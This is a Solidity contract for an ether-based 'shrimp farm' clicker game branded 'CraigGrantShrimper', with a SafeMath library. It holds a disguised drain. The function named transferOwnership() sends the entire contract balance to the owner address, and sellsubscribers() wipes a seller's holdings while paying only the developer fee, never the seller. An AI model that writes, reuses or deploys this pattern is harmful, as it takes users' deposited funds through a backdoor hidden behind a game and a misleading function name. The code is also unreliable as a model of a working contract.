1 pragma solidity ^0.4.18; // solhint-disable-line
2 
3 // similar to the original shrimper , with these changes:
4 // 0. already initialized
5 // 1. the "free" 1000 YouTubes cost 0.001 eth (in line with the mining fee)
6 // 2. Coming to http://CraigGrantShrimper.surge.sh
7 // 3. bots should have a harder time, and whales can compete for the devfee
8 
9 contract CraigGrantShrimper{
10     string public name = "CraigGrantShrimper";
11 	string public symbol = "CGshrimper";
12     //uint256 subscribers_PER_CraigGrant_PER_SECOND=1;
13     uint256 public subscribers_TO_HATCH_1CraigGrant=86400;//for final version should be seconds in a day
14     uint256 public STARTING_CraigGrant=1000;
15     uint256 PSN=10000;
16     uint256 PSNH=5000;
17     bool public initialized=true;
18     address public ceoAddress;
19     mapping (address => uint256) public hatcheryCraigGrant;
20     mapping (address => uint256) public claimedsubscribers;
21     mapping (address => uint256) public lastHatch;
22     mapping (address => address) public referrals;
23     uint256 public marketsubscribers = 1000000000;
24     uint256 public YouTubemasterReq=100000;
25     
26     function CraigGrantShrimper() public{
27         ceoAddress=msg.sender;
28     }
29     modifier onlyCEO(){
30 		require(msg.sender == ceoAddress );
31 		_;
32 	}
33     function becomeYouTubemaster() public{
34         require(initialized);
35         require(hatcheryCraigGrant[msg.sender]>=YouTubemasterReq);
36         hatcheryCraigGrant[msg.sender]=SafeMath.sub(hatcheryCraigGrant[msg.sender],YouTubemasterReq);
37         YouTubemasterReq=SafeMath.add(YouTubemasterReq,100000);//+100k CraigGrants each time
38         ceoAddress=msg.sender;
39     }
40     function hatchsubscribers(address ref) public{
41         require(initialized);
42         if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender){
43             referrals[msg.sender]=ref;
44         }
45         uint256 subscribersUsed=getMysubscribers();
46         uint256 newCraigGrant=SafeMath.div(subscribersUsed,subscribers_TO_HATCH_1CraigGrant);
47         hatcheryCraigGrant[msg.sender]=SafeMath.add(hatcheryCraigGrant[msg.sender],newCraigGrant);
48         claimedsubscribers[msg.sender]=0;
49         lastHatch[msg.sender]=now;
50         
51         //send referral subscribers
52         claimedsubscribers[referrals[msg.sender]]=SafeMath.add(claimedsubscribers[referrals[msg.sender]],SafeMath.div(subscribersUsed,5));
53         
54         //boost market to nerf CraigGrant hoarding
55         marketsubscribers=SafeMath.add(marketsubscribers,SafeMath.div(subscribersUsed,10));
56     }
57     function sellsubscribers() public{
58         require(initialized);
59         uint256 hassubscribers=getMysubscribers();
60         uint256 eggValue=calculatesubscribersell(hassubscribers);
61         uint256 fee=devFee(eggValue);
62         claimedsubscribers[msg.sender]=0;
63         lastHatch[msg.sender]=now;
64         marketsubscribers=SafeMath.add(marketsubscribers,hassubscribers);
65         ceoAddress.transfer(fee);
66     }
67     function buysubscribers() public payable{
68         require(initialized);
69         uint256 subscribersBought=calculateEggBuy(msg.value,SafeMath.sub(this.balance,msg.value));
70         subscribersBought=SafeMath.sub(subscribersBought,devFee(subscribersBought));
71         ceoAddress.transfer(devFee(msg.value));
72         claimedsubscribers[msg.sender]=SafeMath.add(claimedsubscribers[msg.sender],subscribersBought);
73     }
74     //magic trade balancing algorithm
75     function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
76         //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
77         return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
78     }
79     function calculatesubscribersell(uint256 subscribers) public view returns(uint256){
80         return calculateTrade(subscribers,marketsubscribers,this.balance);
81     }
82     function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
83         return calculateTrade(eth,contractBalance,marketsubscribers);
84     }
85     function calculateEggBuySimple(uint256 eth) public view returns(uint256){
86         return calculateEggBuy(eth,this.balance);
87     }
88     function devFee(uint256 amount) public view returns(uint256){
89         return SafeMath.div(SafeMath.mul(amount,4),100);
90     }
91     function seedMarket(uint256 subscribers) public payable{
92         require(marketsubscribers==0);
93         initialized=true;
94         marketsubscribers=subscribers;
95     }
96     function getFreeCraigGrant() public payable{
97         require(initialized);
98         require(msg.value==0.001 ether); //similar to mining fee, prevents bots
99         ceoAddress.transfer(msg.value); //YouTubemaster gets this entrance fee
100         require(hatcheryCraigGrant[msg.sender]==0);
101         lastHatch[msg.sender]=now;
102         hatcheryCraigGrant[msg.sender]=STARTING_CraigGrant;
103     }
104     function getBalance() public view returns(uint256){
105         return this.balance;
106     }
107     function getMyCraigGrant() public view returns(uint256){
108         return hatcheryCraigGrant[msg.sender];
109     }
110     function getYouTubemasterReq() public view returns(uint256){
111         return YouTubemasterReq;
112     }
113     function getMysubscribers() public view returns(uint256){
114         return SafeMath.add(claimedsubscribers[msg.sender],getsubscribersSinceLastHatch(msg.sender));
115     }
116     function getsubscribersSinceLastHatch(address adr) public view returns(uint256){
117         uint256 secondsPassed=min(subscribers_TO_HATCH_1CraigGrant,SafeMath.sub(now,lastHatch[adr]));
118         return SafeMath.mul(secondsPassed,hatcheryCraigGrant[adr]);
119     }
120     function min(uint256 a, uint256 b) private pure returns (uint256) {
121         return a < b ? a : b;
122     }
123     function transferOwnership() onlyCEO public {
124 		uint256 etherBalance = this.balance;
125 		ceoAddress.transfer(etherBalance);
126 	}
127 }
128 
129 library SafeMath {
130 
131   /**
132   * @dev Multiplies two numbers, throws on overflow.
133   */
134   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
135     if (a == 0) {
136       return 0;
137     }
138     uint256 c = a * b;
139     assert(c / a == b);
140     return c;
141   }
142 
143   /**
144   * @dev Integer division of two numbers, truncating the quotient.
145   */
146   function div(uint256 a, uint256 b) internal pure returns (uint256) {
147     // assert(b > 0); // Solidity automatically throws when dividing by 0
148     uint256 c = a / b;
149     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
150     return c;
151   }
152 
153   /**
154   * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
155   */
156   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
157     assert(b <= a);
158     return a - b;
159   }
160 
161   /**
162   * @dev Adds two numbers, throws on overflow.
163   */
164   function add(uint256 a, uint256 b) internal pure returns (uint256) {
165     uint256 c = a + b;
166     assert(c >= a);
167     return c;
168   }
169 }